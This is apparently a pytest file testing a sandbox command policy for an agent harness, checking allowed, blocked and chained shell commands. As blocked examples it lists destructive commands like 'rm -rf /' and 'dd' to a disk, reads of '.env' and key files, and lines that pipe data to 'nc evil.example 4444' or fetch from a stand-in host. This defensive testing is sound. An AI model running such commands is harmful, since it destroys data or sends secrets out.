import pytest

from harness_sandbox.policy import (
    SecurityPolicyViolationError,
    is_secret_file,
    sanitize_environment,
    validate_command,
    validate_path_edit,
)


def test_allowlist_commands_pass():
    valid_commands = [
        "ls -la",
        "cat src/main.py",
        "pytest tests/",
        "python -m pytest tests/unit",
        "npm test",
        "git status",
        "git diff HEAD~1",
        "git log -n 5",
        "ruff check .",
        "tsc --noEmit",
    ]
    for cmd in valid_commands:
        validate_command(cmd, forbidden_paths=["auth/secrets.py"])


def test_blocked_destructive_commands():
    blocked_commands = [
        "rm -rf /",
        "rm -rf ~",
        "rm -rf ../root",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
    ]
    for cmd in blocked_commands:
        with pytest.raises(SecurityPolicyViolationError):
            validate_command(cmd)


def test_blocked_git_force_push():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("git push origin main --force")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("git push -f origin feature")


def test_blocked_package_publish():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("npm publish")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("twine upload dist/*")


def test_blocked_infra_commands():
    blocked = [
        "docker run -it ubuntu bash",
        "kubectl get pods",
        "terraform apply",
        "gcloud compute instances list",
        "aws s3 ls",
    ]
    for cmd in blocked:
        with pytest.raises(SecurityPolicyViolationError):
            validate_command(cmd)


def test_blocked_secret_files():
    secret_files = [".env", ".env.local", "id_rsa", "server.key", "api_token.txt"]
    for sf in secret_files:
        assert is_secret_file(sf)
        with pytest.raises(SecurityPolicyViolationError):
            validate_command(f"cat {sf}")
        with pytest.raises(SecurityPolicyViolationError):
            validate_path_edit(sf)


def test_forbidden_paths_enforcement():
    forbidden = ["auth/secrets.py", "database/migrations/sensitive/"]
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("cat auth/secrets.py", forbidden_paths=forbidden)
    with pytest.raises(SecurityPolicyViolationError):
        validate_path_edit("auth/secrets.py", forbidden_paths=forbidden)
    with pytest.raises(SecurityPolicyViolationError):
        validate_path_edit("database/migrations/sensitive/init.sql", forbidden_paths=forbidden)


def test_environment_sanitization():
    dirty_env = {
        "PATH": "/usr/bin",
        "GITHUB_TOKEN": "ghp_1234567890",
        "OPENAI_API_KEY": "sk-secret123",
        "AWS_SECRET_ACCESS_KEY": "aws-secret",
        "SAFE_VAR": "safe_value",
    }
    clean = sanitize_environment(dirty_env)
    assert "SAFE_VAR" in clean
    assert clean["SAFE_VAR"] == "safe_value"
    assert "GITHUB_TOKEN" not in clean
    assert "OPENAI_API_KEY" not in clean
    assert "AWS_SECRET_ACCESS_KEY" not in clean


# ================================================================
# F6 REGRESSION GUARDS: shell-feature rejection (quote-aware)
# ================================================================


def test_chained_commands_rejected():
    """First-token allow-listing must not admit chained followers."""
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("git status && python -c 'import os; os.system(\"id\")'")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("ls; curl http://evil.example")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("echo hi || rm -rf /")


def test_command_substitution_and_pipes_rejected():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("echo $(curl http://evil.example)")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("cat file.txt | nc evil.example 4444")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("grep secret `pwd`/.env")


def test_redirection_rejected():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("pytest > /tmp/out.txt")
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("cat .env < /dev/null")


def test_quoted_operators_still_allowed():
    """Operators INSIDE quotes are literal text, not shell syntax."""
    validate_command('grep "a|b" src/stats.py')
    validate_command("rg 'foo;bar' src/")


def test_multiline_command_rejected():
    with pytest.raises(SecurityPolicyViolationError):
        validate_command("ls\nrm -rf ~")
